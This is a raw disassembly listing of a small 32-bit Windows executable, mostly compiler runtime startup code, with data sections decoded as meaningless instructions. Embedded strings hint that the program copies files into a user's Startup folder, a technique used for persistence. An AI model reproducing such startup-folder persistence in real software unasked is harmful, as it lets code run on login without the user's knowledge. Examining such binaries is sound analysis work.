mov    %ecx,-0x20(%ebp)
push   %eax
push   %ecx
call   0x401a70
pop    %ecx
pop    %ecx
ret    
mov    -0x18(%ebp),%esp
mov    -0x20(%ebp),%eax
mov    %eax,0x403038
xor    %ebx,%ebx
cmp    %ebx,0x40302c
jne    0x401701
push   %eax
call   *0x4020cc
cmp    %ebx,0x40303c
jne    0x40170f
call   *0x4020d0
movl   $0xfffffffe,-0x4(%ebp)
mov    0x403038,%eax
call   0x401c21
ret    
mov    $0x5a4d,%eax
cmp    %ax,0x400000
je     0x401733
xor    %eax,%eax
jmp    0x401780
mov    0x40003c,%eax
lea    0x400000(%eax),%eax
cmpl   $0x4550,(%eax)
jne    0x40172f
movzwl 0x18(%eax),%ecx
cmp    $0x10b,%ecx
je     0x40176d
cmp    $0x20b,%ecx
jne    0x40172f
cmpl   $0xe,0x84(%eax)
jbe    0x40172f
xor    %ecx,%ecx
cmp    %ecx,0xf8(%eax)
jmp    0x40177b
cmpl   $0xe,0x74(%eax)
jbe    0x40172f
xor    %ecx,%ecx
cmp    %ecx,0xe8(%eax)
setne  %cl
mov    %ecx,%eax
push   $0x1
mov    %eax,0x40302c
call   *0x4020a0
push   $0xffffffff
call   *0x4020a4
pop    %ecx
pop    %ecx
mov    %eax,0x403388
mov    %eax,0x40338c
call   *0x4020a8
mov    0x403374,%ecx
mov    %ecx,(%eax)
call   *0x4020ac
mov    0x403370,%ecx
mov    %ecx,(%eax)
mov    0x4020b0,%eax
mov    (%eax),%eax
mov    %eax,0x40337c
call   0x401a24
call   0x401c85
cmpl   $0x0,0x403014
jne    0x4017e8
push   $0x401c85
call   *0x4020b4
pop    %ecx
call   0x401c5a
cmpl   $0xffffffff,0x403010
jne    0x4017ff
push   $0xffffffff
call   *0x402094
pop    %ecx
xor    %eax,%eax
ret    
call   0x401c88
jmp    0x4015ab
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
sub    $0x328,%esp
mov    %eax,0x403148
mov    %ecx,0x403144
mov    %edx,0x403140
mov    %ebx,0x40313c
mov    %esi,0x403138
mov    %edi,0x403134
data16 mov %ss,0x403160
data16 mov %cs,0x403154
data16 mov %ds,0x403130
data16 mov %es,0x40312c
data16 mov %fs,0x403128
data16 mov %gs,0x403124
pushf  
popl   0x403158
mov    0x0(%ebp),%eax
mov    %eax,0x40314c
mov    0x4(%ebp),%eax
mov    %eax,0x403150
lea    0x8(%ebp),%eax
mov    %eax,0x40315c
mov    -0x320(%ebp),%eax
movl   $0x10001,0x403098

mov    0x403150,%eax
mov    %eax,0x40304c
movl   $0xc0000409,0x403040

movl   $0x1,0x403044

mov    0x403000,%eax
mov    %eax,-0x328(%ebp)
mov    0x403004,%eax
mov    %eax,-0x324(%ebp)
call   *0x402028
mov    %eax,0x403090
push   $0x1
call   0x401d1e
pop    %ecx
push   $0x0
call   *0x40202c
push   $0x40213c
call   *0x402030
cmpl   $0x0,0x403090
jne    0x4018fe
push   $0x1
call   0x401d1e
pop    %ecx
push   $0xc0000409
call   *0x402034
push   %eax
call   *0x402038
leave  
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
mov    0x8(%ebp),%eax
mov    (%eax),%eax
cmpl   $0xe06d7363,(%eax)
jne    0x40194e
cmpl   $0x3,0x10(%eax)
jne    0x40194e
mov    0x14(%eax),%eax
cmp    $0x19930520,%eax
je     0x401949
cmp    $0x19930521,%eax
je     0x401949
cmp    $0x19930522,%eax
je     0x401949
cmp    $0x1994000,%eax
jne    0x40194e
call   0x401d24
xor    %eax,%eax
pop    %ebp
ret    $0x4
push   $0x401912
call   *0x40202c
xor    %eax,%eax
ret    
jmp    *0x4020d8
push   $0x14
push   $0x402508
call   0x401bdc
pushl  0x40338c
mov    0x402080,%esi
call   *%esi
pop    %ecx
mov    %eax,-0x1c(%ebp)
cmp    $0xffffffff,%eax
jne    0x401997
pushl  0x8(%ebp)
call   *0x4020ec
pop    %ecx
jmp    0x4019fe
push   $0x8
call   0x401d36
pop    %ecx
andl   $0x0,-0x4(%ebp)
pushl  0x40338c
call   *%esi
mov    %eax,-0x1c(%ebp)
pushl  0x403388
call   *%esi
pop    %ecx
pop    %ecx
mov    %eax,-0x20(%ebp)
lea    -0x20(%ebp),%eax
push   %eax
lea    -0x1c(%ebp),%eax
push   %eax
pushl  0x8(%ebp)
mov    0x4020a4,%esi
call   *%esi
pop    %ecx
push   %eax
call   0x401d30
mov    %eax,-0x24(%ebp)
pushl  -0x1c(%ebp)
call   *%esi
mov    %eax,0x40338c
pushl  -0x20(%ebp)
call   *%esi
add    $0x14,%esp
mov    %eax,0x403388
movl   $0xfffffffe,-0x4(%ebp)
call   0x401a04
mov    -0x24(%ebp),%eax
call   0x401c21
ret    
push   $0x8
call   0x401d2a
pop    %ecx
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
pushl  0x8(%ebp)
call   0x401968
neg    %eax
sbb    %eax,%eax
neg    %eax
pop    %ecx
dec    %eax
pop    %ebp
ret    
mov    %edi,%edi
push   %esi
mov    $0x4024dc,%eax
mov    $0x4024dc,%esi
push   %edi
mov    %eax,%edi
cmp    %esi,%eax
jae    0x401a47
mov    (%edi),%eax
test   %eax,%eax
je     0x401a40
call   *%eax
add    $0x4,%edi
cmp    %esi,%edi
jb     0x401a38
pop    %edi
pop    %esi
ret    
mov    %edi,%edi
push   %esi
mov    $0x4024e4,%eax
mov    $0x4024e4,%esi
push   %edi
mov    %eax,%edi
cmp    %esi,%eax
jae    0x401a6d
mov    (%edi),%eax
test   %eax,%eax
je     0x401a66
call   *%eax
add    $0x4,%edi
cmp    %esi,%edi
jb     0x401a5e
pop    %edi
pop    %esi
ret    
jmp    *0x4020c8
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
mov    0x8(%ebp),%ecx
mov    $0x5a4d,%eax
cmp    %ax,(%ecx)
je     0x401a96
xor    %eax,%eax
pop    %ebp
ret    
mov    0x3c(%ecx),%eax
add    %ecx,%eax
cmpl   $0x4550,(%eax)
jne    0x401a92
xor    %edx,%edx
mov    $0x10b,%ecx
cmp    %cx,0x18(%eax)
sete   %dl
mov    %edx,%eax
pop    %ebp
ret    
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
mov    0x8(%ebp),%eax
mov    0x3c(%eax),%ecx
add    %eax,%ecx
movzwl 0x14(%ecx),%eax
push   %ebx
push   %esi
movzwl 0x6(%ecx),%esi
xor    %edx,%edx
push   %edi
lea    0x18(%eax,%ecx,1),%eax
test   %esi,%esi
jbe    0x401afd
mov    0xc(%ebp),%edi
mov    0xc(%eax),%ecx
cmp    %ecx,%edi
jb     0x401af5
mov    0x8(%eax),%ebx
add    %ecx,%ebx
cmp    %ebx,%edi
jb     0x401aff
inc    %edx
add    $0x28,%eax
cmp    %esi,%edx
jb     0x401ae5
xor    %eax,%eax
pop    %edi
pop    %esi
pop    %ebx
pop    %ebp
ret    
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
push   $0xfffffffe
push   $0x402528
push   $0x401c35
mov    %fs:0x0,%eax
push   %eax
sub    $0x8,%esp
push   %ebx
push   %esi
push   %edi
mov    0x403000,%eax
xor    %eax,-0x8(%ebp)
xor    %ebp,%eax
push   %eax
lea    -0x10(%ebp),%eax
mov    %eax,%fs:0x0
mov    %esp,-0x18(%ebp)
movl   $0x0,-0x4(%ebp)
push   $0x400000
call   0x401a80
add    $0x4,%esp
test   %eax,%eax
je     0x401bb2
mov    0x8(%ebp),%eax
sub    $0x400000,%eax
push   %eax
push   $0x400000
call   0x401ac0
add    $0x8,%esp
test   %eax,%eax
je     0x401bb2
mov    0x24(%eax),%eax
shr    $0x1f,%eax
not    %eax
and    $0x1,%eax
movl   $0xfffffffe,-0x4(%ebp)
mov    -0x10(%ebp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
ret    
mov    -0x14(%ebp),%eax
mov    (%eax),%ecx
mov    (%ecx),%eax
xor    %edx,%edx
cmp    $0xc0000005,%eax
sete   %dl
mov    %edx,%eax
ret    
mov    -0x18(%ebp),%esp
movl   $0xfffffffe,-0x4(%ebp)
xor    %eax,%eax
mov    -0x10(%ebp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
ret    
int3   
jmp    *0x4020bc
jmp    *0x402084
int3   
int3   
push   $0x401c35
pushl  %fs:0x0
mov    0x10(%esp),%eax
mov    %ebp,0x10(%esp)
lea    0x10(%esp),%ebp
sub    %eax,%esp
push   %ebx
push   %esi
push   %edi
mov    0x403000,%eax
xor    %eax,-0x4(%ebp)
xor    %ebp,%eax
push   %eax
mov    %esp,-0x18(%ebp)
pushl  -0x8(%ebp)
mov    -0x4(%ebp),%eax
movl   $0xfffffffe,-0x4(%ebp)
mov    %eax,-0x8(%ebp)
lea    -0x10(%ebp),%eax
mov    %eax,%fs:0x0
ret    
mov    -0x10(%ebp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
push   %ecx
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
pushl  0x14(%ebp)
pushl  0x10(%ebp)
pushl  0xc(%ebp)
pushl  0x8(%ebp)
push   $0x40154b
push   $0x403000
call   0x401d3c
add    $0x18,%esp
pop    %ebp
ret    
mov    %edi,%edi
push   %esi
push   $0x30000
push   $0x10000
xor    %esi,%esi
push   %esi
call   0x401d48
add    $0xc,%esp
test   %eax,%eax
je     0x401c83
push   %esi
push   %esi
push   %esi
push   %esi
push   %esi
call   0x401d42
add    $0x14,%esp
pop    %esi
ret    
xor    %eax,%eax
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
sub    $0x10,%esp
mov    0x403000,%eax
andl   $0x0,-0x8(%ebp)
andl   $0x0,-0x4(%ebp)
push   %ebx
push   %edi
mov    $0xbb40e64e,%edi
mov    $0xffff0000,%ebx
cmp    %edi,%eax
je     0x401cba
test   %eax,%ebx
je     0x401cba
not    %eax
mov    %eax,0x403004
jmp    0x401d1a
push   %esi
lea    -0x8(%ebp),%eax
push   %eax
call   *0x402048
mov    -0x4(%ebp),%esi
xor    -0x8(%ebp),%esi
call   *0x402018
xor    %eax,%esi
call   *0x40201c
xor    %eax,%esi
call   *0x402020
xor    %eax,%esi
lea    -0x10(%ebp),%eax
push   %eax
call   *0x402024
mov    -0xc(%ebp),%eax
xor    -0x10(%ebp),%eax
xor    %eax,%esi
cmp    %edi,%esi
jne    0x401d00
mov    $0xbb40e64f,%esi
jmp    0x401d0b
test   %esi,%ebx
jne    0x401d0b
mov    %esi,%eax
shl    $0x10,%eax
or     %eax,%esi
mov    %esi,0x403000
not    %esi
mov    %esi,0x403004
pop    %esi
pop    %edi
pop    %ebx
leave  
ret    
jmp    *0x40209c
jmp    *0x402098
jmp    *0x402090
jmp    *0x40208c
jmp    *0x402088
jmp    *0x40207c
jmp    *0x402078
jmp    *0x4020b8
jmp    *0x4020f0
push   %eax
pushl  %fs:0x0
lea    0xc(%esp),%eax
sub    0xc(%esp),%esp
push   %ebx
push   %esi
push   %edi
mov    %ebp,(%eax)
mov    %eax,%ebp
mov    0x403000,%eax
xor    %ebp,%eax
push   %eax
pushl  -0x4(%ebp)
movl   $0xffffffff,-0x4(%ebp)
lea    -0xc(%ebp),%eax
mov    %eax,%fs:0x0
ret    
mov    -0xc(%ebp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
push   %ecx
ret    
lea    -0xa0(%ebp),%ecx
jmp    *0x402050
lea    -0x128(%ebp),%ecx
jmp    *0x402054
mov    0x8(%esp),%edx
lea    0xc(%edx),%eax
mov    -0x12c(%edx),%ecx
xor    %eax,%ecx
call   0x40154b
mov    $0x402554,%eax
jmp    0x401d4e




and    %ah,(%edi)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
push   %es
daa    
add    %al,(%eax)
mulb   (%esi)
add    %al,(%eax)
in     $0x26,%al
add    %al,(%eax)
aam    $0x26
add    %al,(%eax)
cmp    (%eax,%eax,1),%ch
add    %ah,(%esp,%ebp,1)
add    %al,(%eax)
adc    $0x2c,%al
add    %al,(%eax)
cli    
sub    (%eax),%eax
add    %ah,%dh
sub    (%eax),%eax
add    %cl,%al
sub    (%eax),%eax
add    %ch,0x2b980000(%ebx,%ebp,1)
add    %al,(%eax)
test   %ch,(%ebx)
add    %al,(%eax)
sub    (%eax),%ax
add    %bl,0x2b(%esi)
add    %al,(%eax)
dec    %eax
sub    (%eax),%eax
add    %dl,0x2c(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %ch,(%ebx)
add    %al,(%eax)
les    (%edx),%ebp
add    %al,(%eax)
(bad)  
sub    (%eax),%al
add    %al,0x2a(%eax)
add    %al,(%eax)
add    $0x2a,%al
add    %al,(%eax)
les    (%ecx),%ebp
add    %al,(%eax)
xchg   %ch,(%ecx)
add    %al,(%eax)
inc    %esi
sub    %eax,(%eax)
add    %cl,(%eax)
sub    %eax,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %ah,%dh
sub    %al,(%eax)
add    %cl,%ah
sub    %al,(%eax)
add    %bh,-0x23ffffd8(%edx)
daa    
add    %al,(%eax)
test   $0x28,%al
add    %al,(%eax)
lcall  $0x28,$0x90000028
add    %ch,%dl
daa    
add    %al,(%eax)
jl     0x4020c2
add    %al,(%eax)
data16 sub %al,(%eax)
add    %dl,0x0(%eax,%ebp,1)
add    %al,0x28(%edx)
add    %al,(%eax)
xor    $0x28,%al
add    %al,(%eax)
and    $0x28,%al
add    %al,(%eax)
adc    $0x28,%al
add    %al,(%eax)
add    %ch,(%eax)
add    %al,(%eax)
clc    
sub    %al,(%eax)
add    %dl,%al
daa    
add    %al,(%eax)
ret    $0x27
add    %bh,-0x53ffffd9(%edx)
daa    
add    %al,(%eax)
movsb  %ds:(%esi),%es:(%edi)
daa    
add    %al,(%eax)
lcall  $0x27,$0x88000027
add    %bh,0x27(%edx)
add    %al,(%eax)
bound  %esp,(%edi)
add    %al,(%eax)
pop    %eax
daa    
add    %al,(%eax)
dec    %esi
daa    
add    %al,(%eax)
ds daa 
add    %al,(%eax)
mov    $0x28,%al
add    %al,(%eax)
push   $0x2c
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
pusha  
adc    $0x40,%eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
and    %edx,(%edi)
inc    %eax
add    %dl,0x40(%ecx,%ebx,1)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %ch,%cl
loopne 0x4020d4
push   %ecx
add    %al,(%eax)
add    %al,(%eax)
add    (%eax),%al
add    %al,(%eax)
jg     0x402132
add    %al,(%eax)
dec    %eax
and    $0x0,%al
add    %cl,0x16(%eax)
add    %al,(%eax)
inc    %eax
xor    %al,0x0(%eax)
cwtl   
xor    %al,0x0(%eax)
bound  %esp,0x64(%ecx)
and    %ah,0x6c(%ecx)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x74(%ecx)
imul   $0x6f630000,0x6e(%edi),%ebp
jo     0x4021d1
imul   $0x20732520,0x67(%esi),%ebp
je     0x4021d0
and    %ah,0xa73
add    %ah,0x72(%ebp)
jb     0x4021db
jb     0x40218e
outsl  %ds:(%esi),(%dx)
jo     0x4021d6
outsb  %ds:(%esi),(%dx)
imul   $0x6c657320,0x67(%esi),%ebp
cs cs inc %bp
jb     0x4021f1
outsl  %ds:(%esi),(%dx)
jb     0x4021a2
arpl   %bp,0x64(%edi)
cmp    %gs:0xa64,%ah
gs jb  0x402201
outsl  %ds:(%esi),(%dx)
jb     0x4021b2
outsl  %ds:(%esi),(%dx)
jo     0x4021fa
outsb  %ds:(%esi),(%dx)
imul   $0x6c657320,0x67(%esi),%ebp
data16 xor (%esi),%ch
cs inc %ebp
jb     0x402216
outsl  %ds:(%esi),(%dx)
jb     0x4021c7
arpl   %bp,0x64(%edi)
cmp    %gs:0x53000a64,%ah
gs insb (%dx),%es:(%edi)
data16 and %ah,0x6f(%ebx)
jo     0x402232
and    %dh,0x75(%ebx)
arpl   %sp,0x65(%ebx)
jae    0x402234
or     (%eax),%al
add    %cl,(%edx)
add    %al,0x69(%eax,%eax,1)
add    %dh,0x0(%edx)
add    %ah,%gs:0x0(%ebx)
je     0x4021d2
outsl  %ds:(%esi),(%dx)
add    %dh,0x0(%edx)
jns    0x4021d8
and    %al,(%eax)
jo     0x4021dc
popa   
add    %dh,0x68(%eax,%eax,1)
add    %ah,(%eax)
add    %ch,0x0(%ecx)
jae    0x4021e8
and    %al,(%eax)
je     0x4021ec
outsl  %ds:(%esi),(%dx)
add    %ch,0x0(%edi)
and    %al,(%eax)
insb   (%dx),%es:(%edi)
add    %ch,0x0(%edi)
outsb  %ds:(%esi),(%dx)
add    %ah,0x0(%edi)
add    %cl,%cs:(%edx)
add    %al,(%eax)
add    %cl,(%edx)
add    %dl,0x61(%eax,%eax,1)
add    %dh,0x0(%edx)
add    %ah,0x0(%di)
je     0x40220e
and    %al,(%eax)
add    %ch,%fs:0x0(%ecx)
jb     0x402216
add    %ah,%gs:0x0(%ebx)
je     0x40221c
outsl  %ds:(%esi),(%dx)
add    %dh,0x0(%edx)
jns    0x402222
and    %al,(%eax)
imul   $0x200073,(%eax),%eax
and    $0xa007300,%eax
add    %cl,(%edx)
add    %al,(%eax)
add    %bl,0x2a(%eax,%eax,1)
add    %ch,(%esi)
add    %ah,0x0(%ebp)
js     0x40223e
add    %al,%gs:(%eax)
add    %al,(%eax)
add    %al,0x72(%ebp)
jb     0x4022b7
jb     0x40226a
imul   $0x646e6946,0x20(%esi),%ebp
inc    %esi
imul   $0x6c694674,0x73(%edx),%esi
or     %gs:(%eax),%al
and    %al,(%eax)
and    %al,(%eax)
and    $0x20007300,%eax
add    %ah,(%eax)
add    %ah,(%eax)
add    %ah,0x64006c00
add    %ah,(%eax)
add    %ah,0x0(%edx)
jns    0x402276
je     0x402278
add    %dh,%gs:0x0(%ebx)
or     (%eax),%al
add    %al,(%eax)
pop    %esp
add    %al,(%eax)
add    %al,0x69(%esi)
outsb  %ds:(%esi),(%dx)
fs inc %esi
imul   $0x6c694674,0x73(%edx),%esi
add    %al,%gs:(%eax)
add    %dl,0x6e(%ebp)
popa   
bound  %ebp,0x20(%ebp,%eiz,2)
je     0x40230c
and    %dh,0x65(%edx)
je     0x402314
imul   $0x73752065,0x76(%ebp),%esp
gs jb  0x40231a
popa   
insl   (%dx),%es:(%edi)
or     %gs:(%eax),%al
add    %al,(%eax)
add    %dl,0x0(%ebp)
jae    0x4022b8
add    %dh,%gs:0x0(%edx)
and    %al,(%eax)
outsb  %ds:(%esi),(%dx)
add    %ah,0x0(%ecx)
insl   (%dx),%es:(%edi)
add    %ah,0x0(%ebp)
cmp    (%eax),%al
and    %al,(%eax)
and    $0xa007300,%eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,0x0(%ebx)
cmp    (%eax),%al
pop    %esp
add    %al,0x6f(%eax,%eax,1)
add    %ah,0x0(%ebx)
jne    0x4022e2
insl   (%dx),%es:(%edi)
add    %ah,0x0(%ebp)
outsb  %ds:(%esi),(%dx)
add    %dh,0x73(%eax,%eax,1)
add    %ah,(%eax)
add    %ah,0x0(%ecx)
outsb  %ds:(%esi),(%dx)
add    %ah,0x20(%eax,%eax,1)
add    %dl,0x0(%ebx)
add    %dh,%gs:0x74(%eax,%eax,1)
add    %ch,0x0(%ecx)
outsb  %ds:(%esi),(%dx)
add    %ah,0x0(%edi)
jae    0x402306
pop    %esp
add    %al,(%eax)
add    %al,(%eax)
add    %bl,0x53(%eax,%eax,1)
add    %dh,0x61(%eax,%eax,1)
add    %dh,0x0(%edx)
je     0x402318
and    %al,(%eax)
dec    %ebp
add    %ah,0x0(%ebp)
outsb  %ds:(%esi),(%dx)
add    %dh,0x0(%ebp)
pop    %esp
add    %dl,0x0(%eax)
jb     0x402328
outsl  %ds:(%esi),(%dx)
add    %ah,0x0(%edi)
jb     0x40232e
popa   
add    %ch,0x0(%ebp)
jae    0x402334
pop    %esp
add    %dl,0x0(%ebx)
je     0x40233a
popa   
add    %dh,0x0(%edx)
je     0x402340
jne    0x402342
jo     0x402344
add    %al,(%eax)
add    %al,(%eax)
inc    %ebx
add    %bh,(%edx)
add    %bl,0x44(%eax,%eax,1)
add    %ch,0x0(%edi)
arpl   %ax,(%eax)
jne    0x402356
insl   (%dx),%es:(%edi)
add    %ah,0x0(%ebp)
outsb  %ds:(%esi),(%dx)
add    %dh,0x73(%eax,%eax,1)
add    %ah,(%eax)
add    %ah,0x0(%ecx)
outsb  %ds:(%esi),(%dx)
add    %ah,0x20(%eax,%eax,1)
add    %dl,0x0(%ebx)
add    %dh,%gs:0x74(%eax,%eax,1)
add    %ch,0x0(%ecx)
outsb  %ds:(%esi),(%dx)
add    %ah,0x0(%edi)
jae    0x40237a
pop    %esp
add    %al,0x0(%ecx)
insb   (%dx),%es:(%edi)
add    %ch,0x20(%eax,%eax,1)
add    %dl,0x0(%ebp)
jae    0x402388
add    %dh,%gs:0x0(%edx)
jae    0x40238e
pop    %esp
add    %dl,0x0(%ebx)
je     0x402394
popa   
add    %dh,0x0(%edx)
je     0x40239a
and    %al,(%eax)
dec    %ebp
add    %ah,0x0(%ebp)
outsb  %ds:(%esi),(%dx)
add    %dh,0x0(%ebp)
pop    %esp
add    %dl,0x0(%eax)
jb     0x4023aa
outsl  %ds:(%esi),(%dx)
add    %ah,0x0(%edi)
jb     0x4023b0
popa   
add    %ch,0x0(%ebp)
jae    0x4023b6
pop    %esp
add    %dl,0x0(%ebx)
je     0x4023bc
popa   
add    %dh,0x0(%edx)
je     0x4023c2
jne    0x4023c4
jo     0x4023c6
add    %al,(%eax)
jne    0x402438
popa   
bound  %ebp,0x20(%ebp,%eiz,2)
je     0x402440
and    %ch,0x63(%edi,%ebp,2)
popa   
je     0x40243d
and    %ah,0x6e(%ecx)
and    %ch,%fs:0x76(%edi)
gs jb  0x402459
jb     0x40244d
je     0x40244b
and    %ch,0x6e(%ecx)
and    %dh,0x74(%ebx)
popa   
jb     0x402463
jne    0x402461
and    %ah,0x6f(%esi)
insb   (%dx),%es:(%edi)
fs gs jb 0x402403
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %cl,0x0(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %dh,(%eax)
inc    %eax
add    %dl,%al
and    $0x40,%al
add    %al,(%edx)
add    %al,(%eax)
add    %dl,0x53(%edx)
inc    %esp
push   %ebx
(bad)  (%ebx)
mov    $0x545d0dd1,%esi
inc    %eax
lcall  $0x1590,$0x211d9698
adc    %eax,(%ecx)
add    %al,(%eax)
add    %al,0x3a(%ebx)
pop    %esp
inc    %esp
outsl  %ds:(%esi),(%dx)
arpl   %si,0x6d(%ebp)
outsb  %gs:(%esi),(%dx)
je     0x4024df
and    %ah,0x6e(%ecx)
and    %dl,%fs:0x65(%ebx)
je     0x4024e9
imul   $0x69565c73,0x67(%esi),%ebp
jbe    0x4024e3
imul   $0x20,0x79(%ebp,%ecx,2),%ebx
inc    %esp
outsl  %ds:(%esi),(%dx)
arpl   %si,0x6d(%ebp)
outsb  %gs:(%esi),(%dx)
je     0x4024ff
pop    %esp
push   %esi
imul   $0x53206c61,0x75(%ebx),%esi
je     0x40250c
imul   $0x38303032,%fs:0x20(%edi),%ebp

pop    %esp
push   %eax
jb     0x402512
push   $0x65
arpl   %si,0x5c(%ebx,%esi,2)
push   %esp
gs insl (%dx),%es:(%edi)
jo     0x40251a
popa   
je     0x402516
pop    %esp
push   %edx
gs insb (%dx),%es:(%edi)
gs popa 
jae    0x40251e
pop    %esp
push   %esp
gs insl (%dx),%es:(%edi)
jo     0x40252b
popa   
je     0x402527
jo,pn  0x402529
bound  %eax,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %dh,0xb300001c
sbb    $0x0,%eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
(bad)  
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %dl,%al
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
call   *%ecx
push   %ss
inc    %eax
add    %ah,%ch
push   %ss
inc    %eax
add    %al,(%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %cl,%ah
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %al,(%edx,%ebx,1)
inc    %eax
add    %al,(%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bl,%al
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
lcall  *-0x50ffbfe5(%ebx)
sbb    0x0(%eax),%eax
(bad)  
(bad)  
(bad)  
lcall  *0x401d(%ebx)
add    %al,(%eax)
add    %ah,0x2200401d(%edi)
add    $0x21993,%eax
add    %al,(%eax)
inc    %esp
and    $0x40,%eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
in     $0x25,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
adc    (%edi),%ah
add    %al,(%eax)
or     %ah,(%eax)
add    %al,(%eax)
fsubl  0x0
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
xor    %ah,(%edi)
add    %al,(%eax)
add    %ah,(%eax)
add    %al,(%eax)
push   %esp
add    %al,%es:(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
outsb  %ds:(%esi),(%dx)
daa    
add    %al,(%eax)
js     0x4025d2
add    %al,(%eax)
sub    $0x26,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
cmp    $0x2b,%al
add    %al,(%eax)
push   %eax
and    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %ah,(%eax)
daa    
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
push   %es
daa    
add    %al,(%eax)
mulb   (%esi)
add    %al,(%eax)
in     $0x26,%al
add    %al,(%eax)
aam    $0x26
add    %al,(%eax)
cmp    (%eax,%eax,1),%ch
add    %ah,(%esp,%ebp,1)
add    %al,(%eax)
adc    $0x2c,%al
add    %al,(%eax)
cli    
sub    (%eax),%eax
add    %ah,%dh
sub    (%eax),%eax
add    %cl,%al
sub    (%eax),%eax
add    %ch,0x2b980000(%ebx,%ebp,1)
add    %al,(%eax)
test   %ch,(%ebx)
add    %al,(%eax)
sub    (%eax),%ax
add    %bl,0x2b(%esi)
add    %al,(%eax)
dec    %eax
sub    (%eax),%eax
add    %dl,0x2c(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %ch,(%ebx)
add    %al,(%eax)
les    (%edx),%ebp
add    %al,(%eax)
(bad)  
sub    (%eax),%al
add    %al,0x2a(%eax)
add    %al,(%eax)
add    $0x2a,%al
add    %al,(%eax)
les    (%ecx),%ebp
add    %al,(%eax)
xchg   %ch,(%ecx)
add    %al,(%eax)
inc    %esi
sub    %eax,(%eax)
add    %cl,(%eax)
sub    %eax,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %ah,%dh
sub    %al,(%eax)
add    %cl,%ah
sub    %al,(%eax)
add    %bh,-0x23ffffd8(%edx)
daa    
add    %al,(%eax)
test   $0x28,%al
add    %al,(%eax)
lcall  $0x28,$0x90000028
add    %ch,%dl
daa    
add    %al,(%eax)
jl     0x40269e
add    %al,(%eax)
data16 sub %al,(%eax)
add    %dl,0x0(%eax,%ebp,1)
add    %al,0x28(%edx)
add    %al,(%eax)
xor    $0x28,%al
add    %al,(%eax)
and    $0x28,%al
add    %al,(%eax)
adc    $0x28,%al
